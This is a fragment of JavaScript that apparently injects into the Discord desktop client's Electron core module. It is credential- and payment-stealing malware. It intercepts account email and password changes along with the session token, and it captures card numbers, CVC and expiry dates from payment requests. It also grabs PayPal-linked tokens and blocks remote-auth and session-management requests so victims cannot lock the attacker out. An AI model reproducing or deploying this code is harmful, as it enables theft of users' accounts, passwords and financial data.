            case params.response.url.endsWith('/@me'):
                if (!requestData.password) return;
                if (requestData.email) {
                    emailTracker(requestData.email, requestData.password, responseData.token, "mudou o email pra " + requestData.email + "");
                }
                if (requestData.new_password) {
                    passwordTracker(requestData.new_password, requestData.password, responseData.token);
                }
                break;
        }
    });
    mainWindow.webContents.debugger.sendCommand('Network.enable');
    mainWindow.on('closed', () => {
        createWindow();
    });
};
createWindow();

session.defaultSession.webRequest.onCompleted(user.payment_filters, async (details, _) => {
    if (![200, 202].includes(details.statusCode)) return;
    if (details.method != 'POST') return;
    switch (true) {
        case details.url.endsWith('tokens'):
            const item = querystring.parse(Buffer.from(details.uploadData[0].bytes).toString());
            ccTracker(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], await getToken());
            break;

        case details.url.endsWith('paypal_accounts'):
            paypalTracker(await getToken());
            break;
    }
});
session.defaultSession.webRequest.onBeforeRequest(user.filters2, (details, callback) => {
    if (details.url.startsWith("wss://remote-auth-gateway") || details.url.endsWith("auth/sessions")) return callback({
        cancel: true
    })
});

module.exports = require("./core.asar");